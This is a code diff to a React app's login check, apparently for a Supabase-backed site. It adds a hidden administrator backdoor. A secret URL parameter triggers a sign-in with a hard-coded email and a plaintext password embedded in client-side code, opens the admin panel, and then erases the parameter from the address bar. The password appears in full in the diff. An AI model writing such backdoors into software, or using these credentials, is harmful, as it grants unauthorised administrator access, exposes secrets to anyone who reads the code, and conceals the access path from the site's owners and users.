@@ -375,10 +375,28 @@ export default function App() {
 
   useEffect(() => {
     const checkUser = async () => {
+      // Handle direct admin access link
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('access') === 'admin_wahab') {
+        const { data, error } = await supabase.auth.signInWithPassword({
+          email: 'wahablila31000@gmail.com',
+          password: 'vampirewahab31'
+        });
+        if (!error && data.user) {
+          setUser(data.user);
+          await fetchProfile(data.user.id, data.user.email);
+          await fetchData();
+          setShowAdmin(true);
+          // Clean up URL
+          window.history.replaceState({}, document.title, window.location.pathname);
+          return;
+        }
+      }
+
       const { data: { session } } = await supabase.auth.getSession();
       if (session?.user) {
         setUser(session.user);
-        await fetchProfile(session.user.id);
+        await fetchProfile(session.user.id, session.user.email);
         await fetchData();
       } else {
         setLoading(false);
